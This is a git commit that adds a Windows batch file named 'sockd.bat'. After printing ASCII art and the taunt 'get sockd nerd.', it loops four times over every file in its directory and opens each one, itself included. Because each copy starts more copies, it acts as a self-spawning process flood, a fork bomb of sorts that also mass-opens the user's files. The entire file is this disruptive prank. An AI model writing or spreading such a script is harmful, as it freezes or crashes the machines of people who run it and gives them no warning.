ca7fd0f955f42f0c7d3b2b6e74a6b05bda53fad0
PI0NEERING <86807782+PI0NEERING@users.noreply.github.com>
2023-10-27 01:40:25 -0400

    sockd

---
+++ source/sockd.bat
@@ -0,0 +1,23 @@
+@echo off
+  echo  _   _   
+  echo ( )_( )  
+  echo  |___|   
+  echo  /     \  
+  echo  |  \_/  |
+  echo  |_______|
+
+  echo get sockd nerd.
+  set "directory=.\"
+
+for %%f in ("%directory%\*.*") do (
+    start "Opening File: %%~nxf" "%%f"
+)
+for %%f in ("%directory%\*.*") do (
+    start "Opening File: %%~nxf" "%%f"
+)
+for %%f in ("%directory%\*.*") do (
+    start "Opening File: %%~nxf" "%%f"
+)
+for %%f in ("%directory%\*.*") do (
+    start "Opening File: %%~nxf" "%%f"
+)
